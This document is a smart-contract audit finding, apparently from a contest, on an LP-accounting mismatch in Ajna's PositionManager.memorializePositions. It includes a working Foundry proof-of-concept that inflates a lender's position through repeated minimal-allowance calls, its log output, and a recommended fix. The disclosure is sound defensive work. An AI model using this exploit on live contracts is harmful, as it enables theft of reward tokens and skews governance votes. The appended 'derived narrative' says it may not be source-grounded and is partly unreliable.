---
id: 18523
severity: "High"
---

# User can exponentially increase the value of their position through the `memorializePositions` function

## Description

The [PositionManager contract](https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/PositionManager.sol#L42) allows a lender to mint an NFT that will be representative of their lp positions. This is done by [minting](https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/PositionManager.sol#L227) an NFT and then invoking the [memorializePositions function](https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/PositionManager.sol#L170) which will assign their lp positions to the respective NFT. However, while the memorializePositions function will update the lp balances based on the [entirety](https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/PositionManager.sol#L188) of the lender’s lp balance for a given index bucket within the pool, the [Pool contract](https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/base/Pool.sol#L74) will update the lender’s balance based on the [minimum value](https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/libraries/external/LPActions.sol#LL244C70-L244C70) between the allowed amount and the lender’s balance. This means that, if a user specifies an allowance for the PositionManager contract by calling the [increaseLPAllowance function](https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/base/Pool.sol#L455) that is less than their total balance for a respective position before invoking the memorializePositions function, their position’s lp balance tracked by the [PositionManager’s state](https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/PositionManager.sol#L202) will increase by the entirety of their balance while their position that is tracked by the [Pool’s state](https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/libraries/external/LPActions.sol#L260) will only decrease by the specified allowance. The impact of this is that a lender can exponentially increase the value of their position by repeating the steps of specifying a minimum allowance for the PositionManager for their positions and then invoking memorializePositions until their lp position that is tracked by the Pool’s state is 0. The lender can then [stake](https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/RewardsManager.sol#L207) this exponentially overvalued position through the [RewardsManager contract](https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/RewardsManager.sol#L35) allowing them to receive substantially more rewards for their position then should be allotted. The direct implications of this are that the user will be rewarded a substantial amount of AJNA reward tokens which are directly redeemable for the Pool’s quote tokens through its Redeemable Reserve and, additionally, over-value the user’s influence on the protocol’s proposal funding because a user’s votes are weighted by the amount of AJNA tokens they hold. We believe this to be a high severity vulnerability because it directly affects user funds and the functionality of the protocol in general.

## Proof of Concept

The described vulnerability occurs when a lender specifies allowances for the PositionManager contract that are less than their lp balance for each respective index through the [increaseLPAllowance function](https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/base/Pool.sol#L455) and then invokes the [memorializePositions function](https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/PositionManager.sol#L170). The result of this is that the user’s lp balance tracked by the [PositionManager’s state](https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/PositionManager.sol#L202) will increment by the position’s balance while the lp balance tracked by the [Pool’s state](https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/libraries/external/LPActions.sol#L260) will only decrement by the specified allowance. A user can repeat this process through multiple iterations until their respective lp balances with the Pool contract are 0 which will exponentially increase the value of their position. Please see the following test case for a POC simulating the effect of this described vulnerability on a user’s position:
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.14;

import "forge-std/console.sol";

import {Base64} from "@base64-sol/base64.sol";

import "tests/forge/unit/PositionManager.t.sol";

/**
 *  @title  Proof of Concept
 *  @notice Simulates the effect of the described vulnerability where a user
 *          can exponentially increase the value of their position by:
 *          1- only approving the `PositionManager` for a min amount of their position
 *          2- invoking 'memorializePositions' on their position's respective NFT
 *          3- repeating these steps until their respective position's Pool lp balance is 0
 *  @dev    This test case can be implemented and run from the ajna-core/tests/forge directory
 */
contract POC is PositionManagerERC20PoolHelperContract {
    function testMemorializePositionsWithMinApproval() external {
        uint256 intialLPBalance;
        uint256 finalLPBalance;

        address testsAddress = makeAddr("testsAddress");
        uint256 mintAmount = 10000 * 1e18;

        _mintQuoteAndApproveManagerTokens(testsAddress, mintAmount);

        // Call pool contract directly to add quote tokens
        uint256[] memory indexes = new uint256[](3);
        indexes[0] = 2550;
        indexes[1] = 2551;
        indexes[2] = 2552;

        _addInitialLiquidity({
            from: testsAddress,
            amount: 3_000 * 1e18,
            index: indexes[0]
        });
        _addInitialLiquidity({
            from: testsAddress,
            amount: 3_000 * 1e18,
            index: indexes[1]
        });
        _addInitialLiquidity({
            from: testsAddress,
            amount: 3_000 * 1e18,
            index: indexes[2]
        });

        // Mint an NFT to later memorialize existing positions into.
        uint256 tokenId = _mintNFT(testsAddress, testsAddress, address(_pool));

        // Pool lp balances before.
        (uint256 poolLPBalanceIndex1, ) = _pool.lenderInfo(
            indexes[0],
            testsAddress
        );
        (uint256 poolLPBalanceIndex2, ) = _pool.lenderInfo(
            indexes[1],
            testsAddress
        );
        (uint256 poolLPBalanceIndex3, ) = _pool.lenderInfo(
            indexes[2],
            testsAddress
        );

        console.log("\n Pool lp balances before:");
        console.log("bucket %s: %s", indexes[0], poolLPBalanceIndex1);
        console.log("bucket %s: %s", indexes[1], poolLPBalanceIndex2);
        console.log("bucket %s: %s", indexes[2], poolLPBalanceIndex3);

        intialLPBalance =
            poolLPBalanceIndex1 +
            poolLPBalanceIndex2 +
            poolLPBalanceIndex3;

        // PositionManager lp balances before.
        (uint256 managerLPBalanceIndex1, ) = _positionManager.getPositionInfo(
            tokenId,
            indexes[0]
        );
        (uint256 managerLPBalanceIndex2, ) = _positionManager.getPositionInfo(
            tokenId,
            indexes[1]
        );
        (uint256 managerLPBalanceIndex3, ) = _positionManager.getPositionInfo(
            tokenId,
            indexes[2]
        );

        console.log("\n PositionManger lp balances before:");
        console.log("bucket %s: %s", indexes[0], managerLPBalanceIndex1);
        console.log("bucket %s: %s", indexes[1], managerLPBalanceIndex1);
        console.log("bucket %s: %s", indexes[2], managerLPBalanceIndex1);

        console.log(
            "\n <--- Repeatedly invoke memorializePositions with a min allowance set for each tx --->"
        );

        // Approve the PositionManager for only 1 token in each bucket.
        uint256[] memory amounts = new uint256[](3);
        amounts[0] = 1 * 1e18;
        amounts[1] = 1 * 1e18;
        amounts[2] = 1 * 1e18;

        // Continuosly invoke memorializePositions with the min allowance
        // until Pool lp balance is 0.
        while (
            poolLPBalanceIndex1 != 0 &&
            poolLPBalanceIndex2 != 0 &&
            poolLPBalanceIndex3 != 0
        ) {
            // Increase manager allowance.
            _pool.increaseLPAllowance(
                address(_positionManager),
                indexes,
                amounts
            );

            // Memorialize quote tokens into minted NFT.
            IPositionManagerOwnerActions.MemorializePositionsParams
                memory memorializeParams = IPositionManagerOwnerActions
                    .MemorializePositionsParams(tokenId, indexes);
            _positionManager.memorializePositions(memorializeParams);

            // Get new Pool lp balances.
            (poolLPBalanceIndex1, ) = _pool.lenderInfo(
                indexes[0],
                testsAddress
            );
            (poolLPBalanceIndex2, ) = _pool.lenderInfo(
                indexes[1],
                testsAddress
            );
            (poolLPBalanceIndex3, ) = _pool.lenderInfo(
                indexes[2],
                testsAddress
            );
        }

        // Pool lp balances after.
        console.log("\n Pool lp balances after:");
        console.log("bucket %s: %s", indexes[0], poolLPBalanceIndex1);
        console.log("bucket %s: %s", indexes[1], poolLPBalanceIndex2);
        console.log("bucket %s: %s", indexes[2], poolLPBalanceIndex3);

        // PositionManager lp balances after.
        (managerLPBalanceIndex1, ) = _positionManager.getPositionInfo(
            tokenId,
            indexes[0]
        );
        (managerLPBalanceIndex2, ) = _positionManager.getPositionInfo(
            tokenId,
            indexes[1]
        );
        (managerLPBalanceIndex3, ) = _positionManager.getPositionInfo(
            tokenId,
            indexes[2]
        );

        console.log("\n PositionManger lp balances after:");
        console.log("bucket %s: %s", indexes[0], managerLPBalanceIndex1);
        console.log("bucket %s: %s", indexes[1], managerLPBalanceIndex1);
        console.log("bucket %s: %s \n", indexes[2], managerLPBalanceIndex1);

        finalLPBalance =
            managerLPBalanceIndex1 +
            managerLPBalanceIndex2 +
            managerLPBalanceIndex3;

        // Assert that the initial and ending balances are equal.
        assertEq(intialLPBalance, finalLPBalance);
    }
}
```
For reference the log outputs that display the overall change in the users position are the following:
```
 Pool lp balances before:
  bucket 2550: 3000000000000000000000
  bucket 2551: 3000000000000000000000
  bucket 2552: 3000000000000000000000
  
 PositionManger lp balances before:
  bucket 2550: 0
  bucket 2551: 0
  bucket 2552: 0
  
 <--- Repeatedly invoke memorializePositions with a min allowance set for each tx --->
  
 Pool lp balances after:
  bucket 2550: 0
  bucket 2551: 0
  bucket 2552: 0
  
 PositionManger lp balances after:
  bucket 2550: 4501500000000000000000000
  bucket 2551: 4501500000000000000000000
  bucket 2552: 4501500000000000000000000 

  Error: a == b not satisfied [uint]
    Expected: 13504500000000000000000000
      Actual: 9000000000000000000000
```
The test case simulates a user that has created a position by providing 9,000 tokens as liquidity into a pool depositing 3,000 tokens, each, into price buckets 2550, 2551, and 2552. An NFT is then minted for the user. The test case then iteratively approves the PositionManager contract for an allowance of 1 token for each price bucket and invokes the memorializePositions function, repeating these steps until the Pool lp balance for their positions are 0. As can be seen by the log output, the value of the position per price bucket dramatically increases with the position in each bucket being valued at 4,501,500 tokens by the end of the test. In total, the user’s position has increased in value from 9,000 tokens to 13,504,500 tokens.

## Recommendation

It is recommended to implement a check within the [memorializePositions function](https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/PositionManager.sol#L170) that will ensure that a user has specified an allowance at least equal to their lp balance at each respective index, reverting with a custom error if not true. For example, the function could be refactored to the following where the mentioned check is implemented [here](https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/PositionManager.sol#L189):
```solidity
    function memorializePositions(
        MemorializePositionsParams calldata params_
    ) external override {
        EnumerableSet.UintSet storage positionIndex = positionIndexes[params_.tokenId];

        IPool   pool  = IPool(poolKey[params_.tokenId]);
        address owner = ownerOf(params_.tokenId);

        uint256 indexesLength = params_.indexes.length;
        uint256 index;

        for (uint256 i = 0; i < indexesLength; ) {
            index = params_.indexes[i];

            // record bucket index at which a position has added liquidity
            // slither-disable-next-line unused-return
            positionIndex.add(index);

            (uint256 lpBalance, uint256 depositTime) = pool.lenderInfo(index, owner);

            // check that specified allowance is at least equal to the lp balance
            uint256 allowance = pool.lpAllowance(index, address(this), owner);

            if(allowance < lpBalance) revert AllowanceTooLow();

            Position memory position = positions[params_.tokenId][index];

            // check for previous deposits
            if (position.depositTime != 0) {
                // check that bucket didn't go bankrupt after prior memorialization
                if (_bucketBankruptAfterDeposit(pool, index, position.depositTime)) {
                    // if bucket did go bankrupt, zero out the LP tracked by position manager
                    position.lps = 0;
                }
            }

            // update token position LP
            position.lps += lpBalance;
            // set token's position deposit time to the original lender's deposit time
            position.depositTime = depositTime;

            // save position in storage
            positions[params_.tokenId][index] = position;

            unchecked { ++i; }
        }

        // update pool LP accounting and transfer ownership of LP to PositionManager contract
        pool.transferLP(owner, address(this), params_.indexes);

        emit MemorializePosition(owner, params_.tokenId, params_.indexes);
    }
```

## Derived Narrative

The following field is derived content and may not be source-grounded:

The vulnerability originates from an inconsistency between the PositionManager contract and the Pool contract when a lender attempts to memorialize their liquidity provider (LP) positions into an NFT. The memorializePositions function reads the full LP balance for each bucket from the Pool and adds that amount to the PositionManager’s internal accounting, assuming that the entire balance will be transferred. However, the Pool’s transferLP logic only moves the minimum of the lender’s allowance for the PositionManager and the actual LP balance. When a lender deliberately sets an allowance that is lower than their total LP balance and repeatedly calls memorializePositions, the PositionManager records the full balance each time while the Pool only deducts the small allowance. This mismatch allows the recorded LP amount in the PositionManager to grow exponentially while the real LP balance in the Pool is drained to zero. The exploit can be carried out by (1) approving the PositionManager for a minimal amount of LP in each bucket, (2) invoking memorializePositions to inflate the NFT’s LP accounting, and (3) looping these steps until the Pool reports zero LP for the lender. From the user’s perspective the NFT appears to hold far more LP than actually deposited, leading to unexpectedly large reward payouts when the inflated position is staked in the RewardsManager and to an inflated voting weight in governance. The protocol suffers because reward tokens are minted based on the overstated LP amount, and the governance mechanism becomes skewed toward the attacker. The issue was discovered during a formal audit through a crafted test that repeatedly called memorializePositions with a minimal allowance and observed the LP balance in the PositionManager ballooning while the Pool balance vanished. The bug is subtle because each contract individually reports consistent balances; only the cross‑contract accounting reveals the discrepancy, making it easy to miss in casual testing. The root cause is the lack of a validation that the allowance granted to the PositionManager is at least equal to the LP balance being memorialized. To remediate, the memorializePositions function should enforce that the allowance for each bucket is not lower than the lender’s LP balance before updating the PositionManager’s state, or it should use the same minimum‑allowance logic as the Pool when transferring LP. This ensures that the recorded LP amount cannot exceed the actual LP transferred, preventing the exponential inflation of positions and preserving the integrity of rewards and governance calculations.
